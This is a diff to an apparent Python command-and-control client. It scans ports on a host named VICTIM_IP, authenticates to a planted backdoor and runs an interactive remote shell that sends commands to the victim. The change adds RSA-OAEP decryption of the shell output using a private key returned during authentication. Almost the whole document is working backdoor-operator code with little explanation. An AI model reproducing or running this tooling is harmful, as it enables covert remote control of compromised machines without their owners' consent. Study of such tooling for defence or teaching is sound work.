@@ -35,7 +35,7 @@ def _authenticate(message = INIT_MESSAGE):
 
         success = s.recv(4096)
         auth = success == b'success'
-    return auth
+    return auth, priv
 
 def _connect(host = VICTIM_IP, port = BASE_PORT):
     try:
@@ -50,15 +50,16 @@ def find_victim(host = VICTIM_IP, port = BASE_PORT):
         ok = _connect(host, port)
         if ok:
             print(f"[CNCServer] Connected and authenticating port {port}.")
-            ok = _authenticate()
+            ok, priv = _authenticate()
             if ok:
                 print(f"[CNCServer] Authenticated succeeded port {port}.")
-                break
+                return priv
             else:
                 print(f"[CNCServer] Authenticated failed port {port}.")
         port += 1
+    return None
 
-def remote_shell():
+def remote_shell(priv):
     print("[CNCServer] Type 'exit' to exit terminal. Starting terminal...")
 
     while True:
@@ -69,11 +70,19 @@ def remote_shell():
         else:
             s.send(cmd.encode('utf-8'))
         output = s.recv(4096)
+        output = priv.decrypt(
+            output,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
         print(output.decode())
 
 # connect to victim
-find_victim()
+priv = find_victim()
 
 # write commands to backdoor
-remote_shell()
+remote_shell(priv)
 
